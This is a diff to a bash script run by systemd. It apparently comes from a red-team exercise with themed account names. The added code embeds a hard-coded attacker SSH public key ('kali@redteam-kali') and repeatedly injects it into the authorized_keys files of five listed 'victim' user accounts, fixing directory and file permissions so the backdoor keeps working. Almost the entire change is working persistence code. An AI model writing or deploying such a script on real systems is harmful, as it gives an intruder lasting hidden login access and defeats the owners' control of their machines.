@@ -4,12 +4,72 @@
 # This file ensures that Red Team SSH public keys stay present on the target machine
 # in the victim user accounts, running from systemd
 
+set -e
+
+PERSIST_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOZYpBG2fVqTixkCUgz7Z4/nX9THPrElf0tNeqKXhb+jbm5PHIzcdVrc81TqrwN0xuqaOKXPo7EIviNRfznNV8bSnWMZdPlACHAoD7P3v1azDQDdKEjne7l1cmQWcOpFcOwmFhu+q//po5jO92j1iVkzOh82VOXQmL4PboVIR6wlFZR61QBODjWHte5E+zk37793B2fiKZsAyHbPDG6GBar0ihJ53czlKbUo2L5GNkzqHp+RTgE55bcDIQ7oK+OtmtG/MxXHLLb5hhqG8XyDYhoVWnOObO72Tc1RRxPESB6jN70v0DdW/jqtuTLMsP9iqSEoOvBvCvZi/9ggsuL+ih7JxpQzhJGn+ypM6PrkEv8RLEJwH2+8NF8O/5BkrQqj39/2CPvMeA62fTDh0L0SbNe45ugJoNyxNEzTwq2mxSFFUEDaeDbgO9kT7NnF5SxkitA6Gt1fv6qmIBu202krgVk0wXeeTVUaGiXFSxIqXP2jYrb/r4ifEuNUCPZCTFHFuLjLS65wD3R7GjFaIv0pNMc0uinSEFuClCAWvMEAoBidy8lUH5vaJr7NPKP7KJn0B/yiOb36IkhTw+zqn4HWpZuOgVdkUN6PZdYs1+FPyZfXcKvM3DKPelzwfH/+fjSAReV0bQ+lYUSP2sIA8Y+ACjQsjbxXbbZNWtQm+Cwywrtw== kali@redteam-kali"
+
+TARGET_USERS="liquidator shifteng medic dosimeter logkeeper"
+
 # temp file for testing
-TEST_OUTPUT_FILE="/tmp/systemd_test_output.log"
+# TEST_OUTPUT_FILE="/tmp/systemd_test_output.log"
 TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S")
 
 # print to temp file
-echo "$TIMESTAMP - Systemd Test Run Successful. Service is active." >> "$TEST_OUTPUT_FILE"
+# echo "$TIMESTAMP - Systemd Test Run Successful. Service is active." >> "$TEST_OUTPUT_FILE"
 
+# place ssh keys
+for USER in $TARGET_USERS; do
+    # 1. Check if the user exists
+    if ! id -u "$USER" &>/dev/null; then
+        echo "  [WARN] User '$USER' does not exist. Skipping."
+        continue
+    fi
+    
+    # Get the user's home directory (e.g., /home/liquidator)
+    USER_HOME=$(eval echo "~$USER")
+    SSH_DIR="$USER_HOME/.ssh"
+    AUTH_KEYS_FILE="$SSH_DIR/authorized_keys"
+
+    echo "  [INFO] Processing user: $USER (Home: $USER_HOME)"
+
+    # Use 'sudo -u' or 'su -c' to perform actions as the target user.
+    # The script itself must be run as root (or a user with necessary permissions)
+    # for this 'sudo -u' to succeed.
+
+    # 2. Ensure .ssh directory exists and has correct permissions (700)
+    if [ ! -d "$SSH_DIR" ]; then
+        echo "    [FIX] Creating $SSH_DIR."
+        sudo -u "$USER" mkdir -p "$SSH_DIR"
+    fi
+    
+    # Correct permissions for .ssh (must be 700)
+    CURRENT_PERMS=$(stat -c "%a" "$SSH_DIR")
+    if [ "$CURRENT_PERMS" != "700" ]; then
+        echo "    [FIX] Setting permissions on $SSH_DIR to 700."
+        chmod 700 "$SSH_DIR"
+    fi
+
+    # 3. Ensure authorized_keys file exists and contains the persistence key
+    if [ ! -f "$AUTH_KEYS_FILE" ]; then
+        echo "    [FIX] Creating $AUTH_KEYS_FILE and injecting key."
+        echo "$PERSIST_KEY" | sudo -u "$USER" tee "$AUTH_KEYS_FILE" > /dev/null
+    else
+        # Check if the persistence key is already in the authorized_keys file
+        if ! sudo -u "$USER" grep -qF -- "$PERSIST_KEY" "$AUTH_KEYS_FILE"; then
+            echo "    [FIX] Key not found in $AUTH_KEYS_FILE. Injecting key."
+            echo "$PERSIST_KEY" | sudo -u "$USER" tee -a "$AUTH_KEYS_FILE" > /dev/null
+        else
+            echo "    [OK] Persistence key already present."
+        fi
+    fi
+
+    # 4. Correct permissions for authorized_keys (must be 600)
+    CURRENT_PERMS=$(stat -c "%a" "$AUTH_KEYS_FILE" 2>/dev/null || echo "000")
+    if [ "$CURRENT_PERMS" != "600" ]; then
+        echo "    [FIX] Setting permissions on $AUTH_KEYS_FILE to 600."
+        chmod 600 "$AUTH_KEYS_FILE"
+    fi
+    
+done
 
 exit 0
